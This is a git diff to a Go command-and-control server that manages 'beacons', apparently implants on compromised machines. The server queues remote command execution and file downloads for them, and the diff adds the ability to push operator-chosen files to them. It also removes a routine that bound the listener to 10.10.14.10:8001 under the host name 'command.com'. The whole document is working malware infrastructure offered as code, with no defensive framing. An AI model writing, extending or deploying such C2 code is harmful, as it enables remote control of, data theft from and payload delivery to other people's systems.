@@ -2,6 +2,8 @@ package main
 
 import (
 	"github.com/gorilla/mux"
+	"bytes"
+	"mime"
 	"fmt"
 	"time"
 	"log"
@@ -14,7 +16,7 @@ import (
 	"strings"
 	"bufio"
 	"io/ioutil"
-	"bytes"
+	"path/filepath"
 	b64 "encoding/base64"
 )
 
@@ -30,6 +32,7 @@ type Beacon struct {
 	Id string
 	ExecBuffer []string
 	DownloadBuffer []string
+	UploadBuffer []string
 	LastSeen time.Time
 }
 
@@ -41,6 +44,7 @@ var cmdArgs = map[string]string {
     "exec": "<beacon id OR index> <command>...",
     "create": "<LHOST> <LPORT>",
 	"download": "<beacon id OR index> <remote file> OR <remote file>...",
+	"upload": "<beacon id OR index> <local file> OR <local file>...",
 	"use": "<beacon id OR index>",
 }
 
@@ -97,8 +101,22 @@ func saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
 	fmt.Println("Saved " + name + " from " + beacon.Id + "@" + beacon.Ip + " to " + cwd + "/" + path + "/" + name)
 }
 
-func interfaceHandler(w http.ResponseWriter, h *http.Request) {
-	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
+func beaconUploadHandler(w http.ResponseWriter, r *http.Request) {
+	fmt.Println("Serving file to beacon.")
+	file := mux.Vars(r)["data"]
+	plaintext, _ := b64.StdEncoding.DecodeString(file)
+	fullPath := string(plaintext)
+
+	if plaintext[0] != '/' {
+		path, err := os.Getwd()
+		if err != nil {
+			log.Fatal(err)
+		}
+		fullPath = path + "/uploads/" + string(plaintext)
+	}
+
+	w.Header().Set("Content-Type", mime.TypeByExtension(filepath.Ext(fullPath)))
+	http.ServeFile(w, r, fullPath)
 }
 
 func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
@@ -112,15 +130,26 @@ func beaconGetHandler(w http.ResponseWriter, r *http.Request) {
 
 	respMap["exec"] = beacon.ExecBuffer
 	respMap["download"] = beacon.DownloadBuffer
+	respMap["upload"] = beacon.UploadBuffer
 
 	json.NewEncoder(w).Encode(respMap)
 	beacon.ExecBuffer = nil
 	beacon.DownloadBuffer = nil
+	beacon.UploadBuffer = nil
 
 	if len(update.Data) > 0 {
-		out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
-		fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
-		fmt.Println("\t" + out[:len(out)-1])
+		if update.Type == "exec" {
+			out := strings.Replace(string(decodedData), "\n", "\n\t", -1)
+			fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
+			fmt.Println("\t" + out[:len(out)-1])
+		} else if update.Type == "upload" {
+			if(decodedData[0] == '1') {
+				f := strings.Split(string(decodedData), ";")
+				fmt.Println("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
+			} else if(decodedData[0] == '0') {
+				fmt.Println("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
+			}
+		}
 		prompt()
 	}
 }
@@ -139,24 +168,6 @@ func beaconPostHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func startServerRoutine() {
-	var router = mux.NewRouter()
-	router.HandleFunc("/", interfaceHandler).Host("localhost")
-	router.HandleFunc("/{data}", beaconPostHandler).Host("command.com").Methods("Post")
-	router.HandleFunc("/{data}", beaconGetHandler).Host("command.com").Methods("Get")
-
-	srv := &http.Server{
-        Handler:      router,
-        Addr:         "10.10.14.10:8001",
-        WriteTimeout: 15 * time.Second,
-        ReadTimeout:  15 * time.Second,
-    }
-
-	go func() {
-    	log.Fatal(srv.ListenAndServe())	
-	}()
-}
-
 func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	var beacon *Beacon
 	for _, b := range beacons {
@@ -166,7 +177,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	}
 
 	if beacon == nil {
-		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, time.Now()}
+		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -233,6 +244,29 @@ func downloadFile(cmd []string) {
 	}
 }
 
+func uploadFile(cmd []string) {
+	if cmd[1] == "*" {
+		for _, b := range beacons {
+			b.UploadBuffer = append(b.UploadBuffer, cmd[2])
+		}
+		return	
+	}
+
+	var beacon *Beacon = activeBeacon
+	var cmdIndex = 1
+	if beacon == nil {
+		beacon = getBeaconByIdOrIndex(cmd[1])
+		cmdIndex = 2
+	}
+
+	if beacon != nil {
+		beacon.UploadBuffer = append(beacon.UploadBuffer, cmd[cmdIndex])
+		fmt.Println("Added upload command for beacon " + beacon.Id + "@" + beacon.Ip)
+	} else {
+		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+	}
+}
+
 func getBeaconByIdOrIndex(id string) (*Beacon) {
 	var beacon *Beacon
 
@@ -291,6 +325,8 @@ func processInput(input string) {
 			createBeacon(cmd[1], cmd[2])
 		case "list":
 			listBeacons()
+		case "upload":
+			uploadFile(cmd)
 		case "download":
 			downloadFile(cmd)
 		case "use":
